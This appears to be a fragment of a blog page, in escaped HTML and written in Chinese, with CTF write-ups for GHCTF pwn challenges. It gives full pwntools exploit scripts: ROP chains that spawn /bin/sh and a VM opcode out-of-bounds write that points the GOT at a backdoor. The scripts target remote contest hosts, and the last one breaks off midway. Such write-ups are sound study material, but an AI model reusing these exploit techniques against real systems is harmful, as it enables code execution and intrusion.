class=\"line\">log.success(<span class=\"string\">&#x27;read-&#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(read)))</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base=read-libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">sys=libc_base+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">puts=libc_base+libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">printf=libc_base+libc.sym[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\">setvbuf=libc_base+libc.sym[<span class=\"string\">&#x27;setvbuf&#x27;</span>]</span><br><span class=\"line\">bin_sh=libc_base+<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>))</span><br><span class=\"line\">pop_rdi=libc_base+<span class=\"number\">0x2a3e5</span></span><br><span class=\"line\">ret=libc_base+<span class=\"number\">0x29139</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>+p64(puts)+p64(printf)+p64(read)+p64(setvbuf)</span><br><span class=\"line\">payload+=p64(bss)+p64(magic)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;show your magic\\n&quot;</span>,payload)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">payload=offset * <span class=\"string\">b&#x27;a&#x27;</span></span><br><span class=\"line\">payload+=p64(pop_rdi)</span><br><span class=\"line\">payload+=p64(bin_sh)</span><br><span class=\"line\">payload+=p64(ret)</span><br><span class=\"line\">payload+=p64(sys)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"GHCTF-你真的会布置栈吗？\"><a href=\"#GHCTF-你真的会布置栈吗？\" class=\"headerlink\" title=\"GHCTF 你真的会布置栈吗？\"></a>GHCTF 你真的会布置栈吗？</h1><h2 id=\"ida分析-2\"><a href=\"#ida分析-2\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"start函数分析\"><a href=\"#start函数分析\" class=\"headerlink\" title=\"start函数分析\"></a>start函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/813b6b639a05fd8870ff80b5be117df7.png\" alt=\"813b6b639a05fd8870ff80b5be117df7\"></p>\n<p>1.print了两段字符，然后调用sys_read()读取数据，溢出空间非常大<br>2.最后，不是leave ret，而是jmp rsp，var8 是 qword ptr -8  ，可以从汇编代码查看</p>\n<h3 id=\"print函数分析\"><a href=\"#print函数分析\" class=\"headerlink\" title=\"print函数分析\"></a>print函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/a36c17d8abe90bc1a9920db0595e982d.png\" alt=\"a36c17d8abe90bc1a9920db0595e982d\"><br>1.print是通过sys_wirte()，实现写字符，最后也是jmp rsp.</p>\n<h3 id=\"gadgets-分析\"><a href=\"#gadgets-分析\" class=\"headerlink\" title=\"gadgets 分析\"></a>gadgets 分析</h3><p>1.gadgets都已经在上面的图中，可以看到，我们能直接控制的有rsi,rdi,rbx,r13,r15，最后还会jmp r15.<br>2.从print的汇编中可以看到，可以交换rax和r13 的值，因此可以间接控制rax.<br>3.同时，dispatch留有执行rbx中代码的功能.<br>4.下方还可以控制rdx，rsi，rdi 值为0.</p>\n<h2 id=\"构造思路-2\"><a href=\"#构造思路-2\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先，在_start 函数中有很明显的溢出漏洞，并且通过jmp rsp 可以跳转到我们写入的地址。第一眼，考虑shellcode ，但是一下就可以排除。因为它不会执行shellcode，而是跳转地址。因为题目只有系统调用的函数，所以肯定是用syscall解题。<br>2.确定是用syscall写题之后，考虑要控制的寄存器。首先execve函数的系统调用号是0x3b，需要设置rax&#x3D;0x3b，可以通过r13 和 <code>xchg rax，r13</code> 实现，接着是rsi 设置为0 ，rdx 设置为0 ，rdi设置为，<code>&quot;/bin/sh\\x00&quot;</code> 的地址。但是程序中没有该字符串，所以需要，先调用一次read往程序上写入字符串。<br>3.read函数，需要控制rax&#x3D;0，rsi为buf，即写入的地址，rdx为写入字符数。可以利用gadgets 设置rsi 完成任意地址写，利用本身的sys_read 设置字节为0x539。因为程序没有bss段，所以只能往data段上写入字符。<br>4.那么目前的思路就是，利用sys_read往data段写入字符，再执行execve，getshell<br>5.但是似乎忽略了一点。rdx，本身是0x539，我们没有修改，需要通过xor_rdx 来修改为0 ，但是这条指令进跟着的是jmp r15.意味着，我们不能设置r15 为xor_rdx。 考虑让r15 指向xchg rax，r13，将rsp 设置为xor_rdx,也陷入了循环。似乎无法跳出循环。<br>6.此时注意到dispatch,可以跳转到rbx中的指令，而且每次执行会加8，也就是可以执行下一条指令。这样一来，我们把r15 指向dispatch，同时设置rbx为之前sys_read时，buf的地址.然后，之前sys_read时在buf 里依次布置指令，xor_rdx，xchg rax,r13 的地址。这样，将rdx置0 后，程序会跳转到xchg rax，r13 ，将rax 设置为r13的值.最后将rsp 设置为，syscall，就可以完成这华丽的rop。</p>\n<h2 id=\"exp-2\"><a href=\"#exp-2\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"花里胡哨的rop\"><a href=\"#花里胡哨的rop\" class=\"headerlink\" title=\"花里胡哨的rop\"></a>花里胡哨的rop</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;node2.anna.nssctf.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28634</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./attachment&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./attachment&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\">sys_call=<span class=\"number\">0x401077</span></span><br><span class=\"line\">rax_r13=<span class=\"number\">0x40100c</span></span><br><span class=\"line\">data=<span class=\"number\">0x402000</span></span><br><span class=\"line\">gadget_pop=<span class=\"number\">0x401017</span></span><br><span class=\"line\">dispatcher=<span class=\"number\">0x401011</span></span><br><span class=\"line\">xor_rsi=<span class=\"number\">0x401027</span></span><br><span class=\"line\">Free_Gate=<span class=\"number\">0x40101c</span></span><br><span class=\"line\">xor_rdx=<span class=\"number\">0x401021</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(gadget_pop)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span></span><br><span class=\"line\">payload+=p64(gadget_pop) <span class=\"comment\">#r15</span></span><br><span class=\"line\">payload+=p64(data) <span class=\"comment\">#rsi ,rsp</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> <span class=\"comment\">#rdi,rbx,r13</span></span><br><span class=\"line\">payload+=p64(rax_r13) <span class=\"comment\">#r15 </span></span><br><span class=\"line\">payload+=p64(Free_Gate)</span><br><span class=\"line\">payload+=p64(sys_call) <span class=\"comment\">#r15   read</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload+=p64(gadget_pop)<span class=\"comment\"># rsp,rsi</span></span><br><span class=\"line\">payload+=p64(data)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)<span class=\"comment\"># rdi,rbx,r13</span></span><br><span class=\"line\">payload+=p64(gadget_pop)<span class=\"comment\"># r15</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>) <span class=\"comment\"># rsp,rsi</span></span><br><span class=\"line\">payload+=p64(data)+p64(data)+p64(<span class=\"number\">0x3b</span>) <span class=\"comment\"># rdi,rbx,r13</span></span><br><span class=\"line\">payload+=p64(dispatcher)<span class=\"comment\">#r15</span></span><br><span class=\"line\">payload+=p64(sys_call)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">payload+=p64(xor_rdx)+p64(rax_r13)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>","excerpt":"","more":"<h1 id=\"GHCTF-my-vm\"><a href=\"#GHCTF-my-vm\" class=\"headerlink\" title=\"GHCTF my_vm\"></a>GHCTF my_vm</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数分析\"><a href=\"#main函数分析\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h3><p>1.存在backdoor()函数，点开发现system(“&#x2F;bin&#x2F;sh\\x00”).可以直接利用这个地址0x400877.<br>2.funcptr会调用my_print,如果可以修改my_print 为backdoor。那就很完美了<br>3.memory中保存着我们的指令，execute 会按序执行我们的指令，查看这个函数。</p>\n<h3 id=\"execute函数分析\"><a href=\"#execute函数分析\" class=\"headerlink\" title=\"execute函数分析\"></a>execute函数分析</h3><p>1.首先看，对op的处理，和对op的限制<br>2.寻找漏洞。option &#x3D;&#x3D; 0x90 时，可以对memory上的数据作修改<br>3.基于此，如果<code>reg[dest]</code>设置为负数，那么可以完成对其他数据的修改<br>4.从第三张图，查看option &#x3D;&#x3D; 0x90 时的汇编，发现赋值指令是movzx(有符号低扩展为有符号高)，所以可以在<code>reg[]</code>中写入负数，完成数组的向上越界</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先是，ip和sp。ip从0开始，也就从我们读入的第一个指令执行。sp设置为1，大于0就行<br>2.接着读入op。我们需要对op作一点处理，便于控制每一个字节</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Code</span>(<span class=\"params\">op,dest,src1,src2</span>):</span><br><span class=\"line\">    code=(op&lt;&lt;<span class=\"number\">24</span>)+(dest&lt;&lt;<span class=\"number\">16</span>)+(src1&lt;&lt;<span class=\"number\">8</span>)+src2</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(code))</span><br></pre></td></tr></table></figure>\n<p>通过样的处理，我们可以控制每个字节，便于准确的控制<br>3.需要找到要覆盖的目标地址，dest_addr. 这一题中可以覆盖func的内容为backdoor.另外，常见的手法可以覆盖got表内容为backdoor .此题中我采用了后者的方法<br>4.计算对应dest_addr的偏移，这里从汇编中可以看出来，此题中的memory和reg均是以<code>rax*4</code> 来寻址。可知，均是4字节数组.所以对应偏移需要除以4，才能被数组寻到<br>5.得到偏移之后，利用0x90控制数据，注意到，数据会被改写为src1.因此，在调用前需要将某个reg内写入我们的backdoor<br>6.最后，因为我们不能直接往reg里写入任意数据，有字节和大小的限制。所以我们需要通过题目提供的运算操作，一步一步修改内容.</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"修改puts-got\"><a href=\"#修改puts-got\" class=\"headerlink\" title=\"修改puts_got\"></a>修改puts_got</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;node1.anna.nssctf.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28844</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./my_vm&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./my_vm&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Code</span>(<span class=\"params\">op,dest,src1,src2</span>):</span><br><span class=\"line\">    code=(op&lt;&lt;<span class=\"number\">24</span>)+(dest&lt;&lt;<span class=\"number\">16</span>)+(src1&lt;&lt;<span class=\"number\">8</span>)+src2</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(code))</span><br><span class=\"line\"></span><br><span class=\"line\">backdoor=<span class=\"number\">0x400877</span> <span class=\"comment\"># system(&quot;/bin/sh\\x00&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;set your IP:&quot;</span>,<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;set your SP:&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;execve:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">27</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got=<span class=\"number\">0x602018</span></span><br><span class=\"line\">offset=<span class=\"number\">0x6020e0</span>-<span class=\"number\">0x602018</span></span><br><span class=\"line\">reg=<span class=\"number\">0x6420E0</span></span><br><span class=\"line\">memory=<span class=\"number\">0x6020E0</span></span><br><span class=\"line\"><span class=\"comment\">###</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">###</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### Code </span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x8</span>)  <span class=\"comment\"># reg[0]=0x8</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0x4</span>)  <span class=\"comment\"># reg[1]=0x4</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[2]=0xc</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>)    <span class=\"comment\"># reg[3]=reg[1]&lt;&lt;reg[1]  : reg[3]=0xc0</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>,<span class=\"number\">0x6</span>)  <span class=\"comment\"># reg[4]=0x6</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[4]=0xe</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>)    <span class=\"comment\"># reg[1]=reg[1]+reg[3]   : reg[3]=0xce      </span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>,<span class=\"number\">0x7</span>)  <span class=\"comment\"># reg[5]=0x7</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[5]=0xf</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">6</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>)    <span class=\"comment\"># reg[6]=reg[5]&lt;&lt;reg[1]  : reg[6]=0xf0</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">6</span>,<span class=\"number\">6</span>,<span class=\"number\">5</span>)    <span class=\"comment\"># reg[6]=reg[5]+reg[6]   : reg[6]=0xff </span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[5]=reg[6]&lt;&lt;reg[0]  : reg[5]=0xff00</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>)    <span class=\"comment\"># reg[5]=reg[5]+reg[6]   : reg[5]=0xffff</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[5]=reg[5]&lt;&lt;reg[0]  : reg[5]=0xffff00</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>)    <span class=\"comment\"># reg[5]=reg[5]+reg[6]   : reg[5]=0xffffff</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[5]=reg[5]&lt;&lt;reg[0]  : reg[5]=0xffffff00</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">3</span>)    <span class=\"comment\"># reg[5]=reg[5]+reg[3]   : reg[5]=0xffffffce</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#0x400877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>,<span class=\"number\">0x7</span>)  <span class=\"comment\"># reg[4]=0x7</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">6</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>)    <span class=\"comment\"># reg[6]=reg[4]&lt;&lt;reg[1]  : reg[6]=0x70</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">6</span>,<span class=\"number\">6</span>,<span class=\"number\">4</span>)    <span class=\"comment\"># reg[6]=reg[6]+reg[4]   : reg[6]=0x770000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>)    <span class=\"comment\"># reg[1]=reg[1]&lt;&lt;reg[1]  : reg[1]=0x40</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[1]=reg[1]&lt;&lt;reg[0]  : reg[1]=0x4000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[1]=reg[1]&lt;&lt;reg[0]  : reg[1]=0x400000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[0]=reg[0]&lt;&lt;reg[0]  : reg[0]=0x800</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">6</span>)    <span class=\"comment\"># reg[0]=reg[0]+reg[6]   : reg[0]=0x877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[1]=reg[1]+reg[0]   : reg[1]=0x4000877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x90</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># mem[reg[5]]=reg[1]     : mem[-50]=0x4000877</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"覆盖func\"><a href=\"#覆盖func\" class=\"headerlink\" title=\"覆盖func\"></a>覆盖func</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">0</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;node1.anna.nssctf.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28844</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./my_vm&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./my_vm&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Code</span>(<span class=\"params\">op,dest,src1,src2</span>):</span><br><span class=\"line\">    code=(op&lt;&lt;<span class=\"number\">24</span>)+(dest&lt;&lt;<span class=\"number\">16</span>)+(src1&lt;&lt;<span class=\"number\">8</span>)+src2</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(code))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;set your IP:&quot;</span>,<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;set your SP:&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;execve:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">14</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### Code </span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">8</span>)   <span class=\"comment\">#reg[0]=8</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">Code(<span class=\"number\">0x50</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[1]=-8</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">2</span>,<span class=\"number\">0</span>,<span class=\"number\">7</span>)   <span class=\"comment\">#reg[2]=7</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>,<span class=\"number\">4</span>)   <span class=\"comment\">#reg[4]=4</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">4</span>)   <span class=\"comment\">#reg[3]=0x70</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>)   <span class=\"comment\">#reg[3]=0x77</span></span><br><span class=\"line\"><span class=\"comment\">### backdoor  </span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>)   <span class=\"comment\">#reg[4]=0x40</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[4]=0x4000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[4]=0x400000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">0</span>,<span 